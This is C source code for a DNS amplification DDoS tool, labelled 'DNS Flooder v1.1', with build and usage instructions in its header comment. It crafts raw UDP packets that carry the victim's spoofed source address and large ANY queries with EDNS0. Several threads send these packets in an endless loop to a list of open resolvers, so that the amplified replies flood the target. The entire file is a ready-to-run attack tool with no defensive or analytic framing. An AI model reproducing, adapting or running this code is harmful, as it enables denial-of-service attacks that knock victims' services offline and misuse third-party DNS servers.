/*
*	DNS.c - DNS DDOS SCRIPT
*
*  $ gcc -o dns DNS.c -pthread
*  $ ./dns 1.1.1.1 80 AmpList/dns.list 10 60
*/

#include <time.h>
#include <pthread.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <arpa/inet.h>

#define MAX_PACKET_SIZE 8192
#define PHI 0x9e3779b9
#define PACKETS_PER_RESOLVER 15

static uint32_t Q[4096], c = 362436;

struct list
{
    struct sockaddr_in data;
    char domain[512];
    int line;
    struct list *next;
    struct list *prev;
};
struct list *head;

struct thread_data 
{
    int thread_id;
    struct list *list_node;
    struct sockaddr_in sin;
    int port;
};

struct DNS_HEADER
{
    unsigned short id; 
    unsigned char rd :1;
    unsigned char tc :1; 
    unsigned char aa :1;
    unsigned char opcode :4; 
    unsigned char qr :1;

    unsigned char rcode :4; 
    unsigned char cd :1; 
    unsigned char ad :1; 
    unsigned char z :1;
    unsigned char ra :1; 

    unsigned short q_count; 
    unsigned short ans_count; 
    unsigned short auth_count;
    unsigned short add_count; 
};

struct QUESTION
{
  unsigned short qtype;
  unsigned short qclass;
};

struct QUERY
{
    unsigned char *name;
    struct QUESTION *ques;
};

void ChangetoDnsNameFormat(unsigned char* dns,unsigned char* host)
{
    int lock = 0 , i;
    strcat((char*)host,".");

	for (i = 0; i < strlen((char*)host); i++)
    {
		if(host[i]=='.')
		{
			*dns++ = i-lock;
			for (; lock < i; lock++)
			{
				*dns++=host[lock];
			}
			lock++; //or lock=i+1;
		}
    }
    *dns++='\0';
}

void init_rand(uint32_t x)
{
    int i;

    Q[0] = x;
    Q[1] = x + PHI;
    Q[2] = x + PHI + PHI;

    for (i = 3; i < 4096; i++)
    Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i;
}

uint32_t rand_cmwc(void)
{
    uint64_t t, a = 18782LL;
    static uint32_t i = 4095;
    uint32_t x, r = 0xffe;
    i = (i + 1) & 4095;
    t = a * Q[i] + c;
    c = (t >> 32);
    x = t + c;
    if (x < c) 
	{
		x++;
		c++;
    }
    return (Q[i] = r - x);
}

unsigned short csum (unsigned short *buf, int nwords)
{
    unsigned long sum;
    for (sum = 0; nwords > 0; nwords--)
    sum += *buf++;
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    return (unsigned short)(~sum);
}

void setup_udp_header(struct udphdr *udph)
{

}

void *flood(void *par1)
{
    struct thread_data *td = (struct thread_data *)par1;

    char strPacket[MAX_PACKET_SIZE];
    int iPayloadSize = 0;

    struct sockaddr_in sin = td->sin;
    struct list *list_node = td->list_node;
    int iPort = td->port;

    int s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if(s < 0)
    {
    fprintf(stderr, "Could not open raw socket. You need to be root!\n");
    exit(-1);
    }

    init_rand(time(NULL));

    memset(strPacket, 0, MAX_PACKET_SIZE);

    struct iphdr *iph = (struct iphdr *) &strPacket;
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof(struct iphdr) + 38;
    iph->id = htonl(54321);
    iph->frag_off = 0;
    iph->ttl = MAXTTL;
    iph->protocol = IPPROTO_UDP;
    iph->check = 0;
    iph->saddr = inet_addr("192.168.5.100");

    iPayloadSize += sizeof(struct iphdr);

    struct udphdr *udph = (struct udphdr *) &strPacket[iPayloadSize];
    udph->source = htons(iPort);
    udph->dest = htons(53);
    udph->check = 0;

    iPayloadSize += sizeof(struct udphdr);

    struct DNS_HEADER *dns  = (struct DNS_HEADER *) &strPacket[iPayloadSize];
    dns->id = (unsigned short) htons(rand_cmwc());
    dns->qr = 0; //This is a query
    dns->opcode = 0; //This is a standard query
    dns->aa = 0; //Not Authoritative
    dns->tc = 0; //This message is not truncated
    dns->rd = 1; //Recursion Desired
    dns->ra = 0; //Recursion not available! hey we dont have it (lol)
    dns->z = 0;
    dns->ad = 0;
    dns->cd = 0;
    dns->rcode = 0;
    dns->q_count = htons(1); //we have only 1 question
    dns->ans_count = 0;
    dns->auth_count = 0;
    dns->add_count = htons(1);

    iPayloadSize += sizeof(struct DNS_HEADER);

    sin.sin_port = udph->source;
    iph->saddr = sin.sin_addr.s_addr;
    iph->daddr = list_node->data.sin_addr.s_addr;
    iph->check = csum ((unsigned short *) strPacket, iph->tot_len >> 1);

    char strDomain[512];
    int i;
    int j = 0;
    int iAdditionalSize = 0;

	while (1)
    {
		if(j==2)
		{
			usleep(100);
			j=0;
		}

		list_node = list_node->next;

		memset(&strPacket[iPayloadSize + iAdditionalSize], 0, iAdditionalSize+256);

		iAdditionalSize = 0;

		unsigned char *qname = (unsigned char*) &strPacket[iPayloadSize + iAdditionalSize];

		strcpy(strDomain, list_node->domain);
		ChangetoDnsNameFormat(qname, strDomain);

		iAdditionalSize += strlen(qname) + 1;

		struct QUESTION *qinfo = (struct QUESTION *) &strPacket[iPayloadSize + iAdditionalSize];
		qinfo->qtype = htons(255); //type of the query , A , MX , CNAME , NS etc
		qinfo->qclass = htons(1);

		iAdditionalSize += sizeof(struct QUESTION);

		strPacket[iPayloadSize + iAdditionalSize] = 0x00;
		strPacket[iPayloadSize + iAdditionalSize + 1] = 0x00;
		strPacket[iPayloadSize + iAdditionalSize + 2] = 0x29;
		strPacket[iPayloadSize + iAdditionalSize + 3] = 0x23;
		strPacket[iPayloadSize + iAdditionalSize + 4] = 0x28;
		strPacket[iPayloadSize + iAdditionalSize + 5] = 0x00;
		strPacket[iPayloadSize + iAdditionalSize + 6] = 0x00;
		strPacket[iPayloadSize + iAdditionalSize + 7] = 0x00;
		strPacket[iPayloadSize + iAdditionalSize + 8] = 0x00;
		strPacket[iPayloadSize + iAdditionalSize + 9] = 0x00;
		strPacket[iPayloadSize + iAdditionalSize + 10] = 0x00;
		strPacket[iPayloadSize + iAdditionalSize + 11] = 0x00;

		iAdditionalSize += 11;

		iph->daddr = list_node->data.sin_addr.s_addr;

		udph->len= htons((iPayloadSize + iAdditionalSize) - sizeof(struct iphdr));
		iph->tot_len = iPayloadSize + iAdditionalSize;

		udph->source = htons(rand_cmwc() & 0xFFFF);
		iph->check = csum ((unsigned short *) strPacket, iph->tot_len >> 1);
    
		for (i = 0; i < PACKETS_PER_RESOLVER; i++)
		{
			sendto(s, strPacket, iph->tot_len, 0, (struct sockaddr *) &list_node->data, sizeof(list_node->data));
		}
		j++;
    }
}

void ParseResolverLine(char *strLine, int iLine)
{
  char caIP[32] = "";
  char caDNS[512] = "";

  int i;
  char buffer[512] = "";

  int moved = 0;

  for (i = 0; i < strlen(strLine); i++)
  {
	  if (strLine[i] == ' ' || strLine[i] == '\n' || strLine[i] == '\t')
	  {
		  moved++;
		  continue;
	  }

	  if (moved == 0)
	  {
		  caIP[strlen(caIP)] = (char) strLine[i];
	  } else if (moved == 1) {
		  caDNS[strlen(caDNS)] = (char) strLine[i];
	  }
  }

  if (head == NULL)
  {
    head = (struct list *)malloc(sizeof(struct list));

    bzero(&head->data, sizeof(head->data));

    head->data.sin_addr.s_addr=inet_addr(caIP);
    head->data.sin_port=htons(53);
    strcpy(head->domain, caDNS);
    head->line = iLine;
    head->next = head;
    head->prev = head;
  } else {
    struct list *new_node = (struct list *)malloc(sizeof(struct list));

    memset(new_node, 0x00, sizeof(struct list));

	new_node->data.sin_addr.s_addr = inet_addr(caIP);
	new_node->data.sin_port = htons(53);
    strcpy(new_node->domain, caDNS);
    new_node->prev = head;
    head->line = iLine;
    new_node->next = head->next;
    head->next = new_node;
  }
}

int main(int argc, char *argv[ ])
{
	if (argc < 4)
	{
		fprintf(stderr, "Invalid parameters!\n");
		fprintf(stderr, "DNS Flooder v1.1\nUsage: %s <target IP/hostname> <port to hit> <reflection file (format: IP DOMAIN>> <number threads to use> <time (optional)>\n", argv[0]);
		fprintf(stderr, "Reflection File Format: <IP>[space/tab]<DOMAIN>[space/tab]<IGNORED>[space/tab]<IGNORED>...\n");
		exit(-1);
	}

	head = NULL;

	char *strLine = (char *) malloc(256);
	strLine = memset(strLine, 0x00, 256);

	char strIP[32] = "";
	char strDomain[256] = "";

	int iLine = 0; // 0 = ip, 1 = domain.

	FILE *list_fd = fopen(argv[3],  "r");
	while (fgets(strLine, 256, list_fd) != NULL)
	{
		ParseResolverLine(strLine, iLine);
		iLine++;
	}

	int i = 0;
	int num_threads = atoi(argv[4]);

	struct list *current = head->next;
	pthread_t thread[num_threads];
	struct sockaddr_in sin;
	sin.sin_family = AF_INET;
	sin.sin_port = htons(0);
	sin.sin_addr.s_addr = inet_addr(argv[1]);
	struct thread_data td[num_threads];

	 int iPort = atoi(argv[2]);

	 for (i = 0; i < num_threads; i++)
	 {
		 current = current->next;
		 td[i].thread_id = i;
		 td[i].sin= sin;
		 td[i].list_node = current;
		 td[i].port = iPort;
		 pthread_create(&thread[i], NULL, &flood, (void *)&td[i]);
	 }

	 if (argc > 4)
	 {
		 sleep(atoi(argv[5]));
	 } else {
		 while(1)
		 {
			 sleep(1);
		 }
	 }
	 return 0;
}
